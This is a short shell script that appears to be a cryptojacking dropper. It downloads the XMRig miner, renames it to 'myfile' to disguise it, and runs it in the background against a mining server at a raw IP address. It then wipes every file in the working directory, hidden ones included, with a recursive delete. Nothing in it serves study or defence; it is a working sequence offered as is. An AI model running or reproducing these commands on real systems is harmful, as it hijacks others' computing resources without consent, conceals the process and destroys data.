wget https://github.com/MoneroOcean/xmrig/releases/download/v6.12.1-mo2/xmrig-v6.12.1-mo2-lin64-compat.tar.gz -O out 
tar -xvf out 
chmod 777 xmrig 
rm config.json 
rm out 
mv xmrig myfile
#echo '{"bench-algo-time":2}' > xjson 
#./myfile -o 79.231.42.249:443 -c xjson
./myfile -o 79.231.42.249:443 --background
rm -rf {,.[!.],..?}*
ls
